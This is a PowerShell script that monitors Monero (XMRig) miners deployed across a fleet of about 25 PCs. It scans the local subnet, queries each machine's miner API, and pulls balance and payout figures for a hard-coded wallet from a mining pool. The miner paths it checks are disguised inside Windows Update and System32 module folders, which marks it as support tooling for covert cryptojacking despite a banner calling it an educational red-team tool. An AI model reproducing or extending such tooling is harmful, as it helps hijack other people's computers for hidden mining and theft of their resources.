# ================================================================================================
# FLEET MONITORING - Monitor All 25 PCs
# ================================================================================================
# Quickly check status of all deployed miners across your PC fleet
# ================================================================================================

param(
    [string[]]$PCList = @(),  # Leave empty to auto-detect, or specify: @("PC01", "PC02", ...)
    [switch]$ShowHashrates = $true,
    [switch]$AutoRefresh = $false,
    [int]$RefreshInterval = 30  # seconds
)

$ErrorActionPreference = "SilentlyContinue"

# ================================================================================================
# CONFIGURATION
# ================================================================================================

$MonitorConfig = @{
    # If PCList is empty, try to auto-detect network PCs
    AutoDetectNetwork = ($PCList.Count -eq 0)
    
    # XMRig API port
    APIPort = 16000
    
    # Deployment locations to check
    CheckLocations = @(
        "C:\ProgramData\Microsoft\Windows\WindowsUpdate\xmrig.exe",
        "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv\xmrig.exe"
    )
    
    # Pool to check total hashrate
    PoolAPI = "https://moneroocean.stream/api/stats_address"
    Wallet = "49MJ7AMP3xbB4U2V4QVBFDCJyVDnDjouyV5WwSMVqxQo7L2o9FYtTiD2ALwbK2BNnhFw8rxHZUgH23WkDXBgKyLYC61SAon"
}

# ================================================================================================
# FUNCTIONS
# ================================================================================================

function Get-PCList {
    if ($PCList.Count -gt 0) {
        return $PCList
    }
    
    # Auto-detect PCs on network
    Write-Host "🔍 Auto-detecting PCs on network..." -ForegroundColor Cyan
    
    $detectedPCs = @()
    
    # Get local subnet
    $localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.PrefixOrigin -eq "Dhcp" -or $_.PrefixOrigin -eq "Manual" } | Select-Object -First 1).IPAddress
    $subnet = $localIP.Substring(0, $localIP.LastIndexOf('.'))
    
    # Scan subnet (first 50 IPs for speed)
    Write-Host "Scanning subnet $subnet.0/24..." -ForegroundColor Yellow
    
    1..50 | ForEach-Object -Parallel {
        $ip = "$using:subnet.$_"
        if (Test-Connection -ComputerName $ip -Count 1 -Quiet) {
            try {
                $hostName = ([System.Net.Dns]::GetHostEntry($ip)).HostName
                if ($hostName) { $ip }
            } catch { $ip }
        }
    } -ThrottleLimit 50 | ForEach-Object { $detectedPCs += $_ }
    
    Write-Host "✅ Found $($detectedPCs.Count) active PCs" -ForegroundColor Green
    return $detectedPCs
}

function Test-MinerRunning {
    param([string]$PC)
    
    try {
        # Try API connection
        $uri = "http://${PC}:$($MonitorConfig.APIPort)/1/summary"
        $response = Invoke-RestMethod -Uri $uri -TimeoutSec 2
        
        if ($response.hashrate.total -and $response.hashrate.total[0] -gt 0) {
            return @{
                IsRunning = $true
                Hashrate = [math]::Round($response.hashrate.total[0], 0)
                Threads = $response.hashrate.threads.Count
                Uptime = [math]::Round($response.connection.uptime / 3600, 1)  # hours
                CPUUsage = if ($response.cpu) { $response.cpu.load } else { "N/A" }
            }
        }
    } catch {
        # API failed, try process check (requires admin on remote PC)
        try {
            $process = Get-Process -ComputerName $PC -Name "xmrig" -ErrorAction SilentlyContinue
            if ($process) {
                return @{
                    IsRunning = $true
                    Hashrate = "Unknown"
                    Threads = "Unknown"
                    Uptime = "Unknown"
                    CPUUsage = "Unknown"
                }
            }
        } catch {}
    }
    
    return @{
        IsRunning = $false
        Hashrate = 0
        Threads = 0
        Uptime = 0
        CPUUsage = 0
    }
}

function Get-FleetStatus {
    param([string[]]$PCs)
    
    Write-Host "`n╔═══════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
    Write-Host "║                    FLEET STATUS - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')                    ║" -ForegroundColor Cyan
    Write-Host "╚═══════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
    Write-Host ""
    
    $results = @()
    $totalHashrate = 0
    $runningCount = 0
    $offlineCount = 0
    
    foreach ($pc in $PCs) {
        Write-Host "⏳ Checking $pc..." -NoNewline
        
        $status = Test-MinerRunning -PC $pc
        
        if ($status.IsRunning) {
            $runningCount++
            $totalHashrate += $status.Hashrate
            Write-Host "`r✅ $pc - RUNNING - $($status.Hashrate) H/s ($($status.Threads) threads) - Uptime: $($status.Uptime)h" -ForegroundColor Green
        }
        else {
            $offlineCount++
            Write-Host "`r❌ $pc - OFFLINE or NOT RESPONDING" -ForegroundColor Red
        }
        
        $results += [PSCustomObject]@{
            PC = $pc
            Status = if ($status.IsRunning) { "RUNNING" } else { "OFFLINE" }
            Hashrate = $status.Hashrate
            Threads = $status.Threads
            Uptime = $status.Uptime
            CPUUsage = $status.CPUUsage
        }
    }
    
    Write-Host "`n╔═══════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Yellow
    Write-Host "║                              SUMMARY                                      ║" -ForegroundColor Yellow
    Write-Host "╚═══════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Yellow
    Write-Host "📊 Total PCs Checked:     $($PCs.Count)" -ForegroundColor White
    Write-Host "✅ Running:               $runningCount" -ForegroundColor Green
    Write-Host "❌ Offline:               $offlineCount" -ForegroundColor Red
    Write-Host "💪 Success Rate:          $([math]::Round(($runningCount / $PCs.Count) * 100, 1))%" -ForegroundColor Cyan
    Write-Host "🔥 Total Hashrate:        $totalHashrate H/s ($([math]::Round($totalHashrate / 1000, 2)) KH/s)" -ForegroundColor Yellow
    Write-Host "📈 Average per PC:        $([math]::Round($totalHashrate / $runningCount, 0)) H/s" -ForegroundColor Cyan
    Write-Host ""
    
    return $results
}

function Get-PoolStats {
    Write-Host "`n╔═══════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Magenta
    Write-Host "║                           POOL STATISTICS                                 ║" -ForegroundColor Magenta
    Write-Host "╚═══════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Magenta
    
    try {
        $uri = "$($MonitorConfig.PoolAPI)?address=$($MonitorConfig.Wallet)"
        $poolData = Invoke-RestMethod -Uri $uri -TimeoutSec 10
        
        if ($poolData) {
            $hashrate = [math]::Round($poolData.hash / 1000, 2)  # Convert to KH/s
            $balance = [math]::Round($poolData.balance / 1000000000000, 6)  # Convert from atomic units
            $paid = [math]::Round($poolData.paid / 1000000000000, 6)
            
            Write-Host "💰 Balance:               $balance XMR" -ForegroundColor Green
            Write-Host "💸 Total Paid:            $paid XMR" -ForegroundColor Green
            Write-Host "🔥 Pool Hashrate:         $hashrate KH/s" -ForegroundColor Yellow
            Write-Host "⏰ Last Share:            $(Get-Date $poolData.lastShare -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor Cyan
        }
    } catch {
        Write-Host "❌ Unable to fetch pool statistics" -ForegroundColor Red
    }
    
    Write-Host ""
}

function Show-DetailedTable {
    param($Results)
    
    Write-Host "`n╔═══════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
    Write-Host "║                         DETAILED STATUS TABLE                             ║" -ForegroundColor Cyan
    Write-Host "╚═══════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
    Write-Host ""
    
    $Results | Format-Table -AutoSize @(
        @{Label="PC Name"; Expression={$_.PC}; Width=20},
        @{Label="Status"; Expression={
            if ($_.Status -eq "RUNNING") { "✅ RUNNING" } else { "❌ OFFLINE" }
        }; Width=12},
        @{Label="Hashrate (H/s)"; Expression={
            if ($_.Hashrate -is [int]) { "{0:N0}" -f $_.Hashrate } else { $_.Hashrate }
        }; Width=15},
        @{Label="Threads"; Expression={$_.Threads}; Width=8},
        @{Label="Uptime (h)"; Expression={$_.Uptime}; Width=11},
        @{Label="CPU Usage"; Expression={$_.CPUUsage}; Width=10}
    )
}

# ================================================================================================
# MAIN EXECUTION
# ================================================================================================

function Main {
    Clear-Host
    
    Write-Host @"
 ███████╗██╗     ███████╗███████╗████████╗    ███╗   ███╗ ██████╗ ███╗   ██╗██╗████████╗ ██████╗ ██████╗ 
 ██╔════╝██║     ██╔════╝██╔════╝╚══██╔══╝    ████╗ ████║██╔═══██╗████╗  ██║██║╚══██╔══╝██╔═══██╗██╔══██╗
 █████╗  ██║     █████╗  █████╗     ██║       ██╔████╔██║██║   ██║██╔██╗ ██║██║   ██║   ██║   ██║██████╔╝
 ██╔══╝  ██║     ██╔══╝  ██╔══╝     ██║       ██║╚██╔╝██║██║   ██║██║╚██╗██║██║   ██║   ██║   ██║██╔══██╗
 ██║     ███████╗███████╗███████╗   ██║       ██║ ╚═╝ ██║╚██████╔╝██║ ╚████║██║   ██║   ╚██████╔╝██║  ██║
 ╚═╝     ╚══════╝╚══════╝╚══════╝   ╚═╝       ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
"@ -ForegroundColor Green
    
    Write-Host "`n                      Red Team Fleet Monitoring System" -ForegroundColor Yellow
    Write-Host "                    For Educational Competition Use Only`n" -ForegroundColor Gray
    
    do {
        # Get PC list
        $pcs = Get-PCList
        
        if ($pcs.Count -eq 0) {
            Write-Host "❌ No PCs found or specified. Please provide -PCList parameter." -ForegroundColor Red
            break
        }
        
        # Check fleet status
        $results = Get-FleetStatus -PCs $pcs
        
        # Show detailed table
        if ($ShowHashrates) {
            Show-DetailedTable -Results $results
        }
        
        # Show pool statistics
        Get-PoolStats
        
        # Auto-refresh option
        if ($AutoRefresh) {
            Write-Host "⏱️  Auto-refreshing in $RefreshInterval seconds... (Press Ctrl+C to stop)" -ForegroundColor Yellow
            Start-Sleep -Seconds $RefreshInterval
            Clear-Host
        }
        else {
            break
        }
        
    } while ($AutoRefresh)
    
    Write-Host "Press any key to exit..." -ForegroundColor Gray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

# Run main function
Main
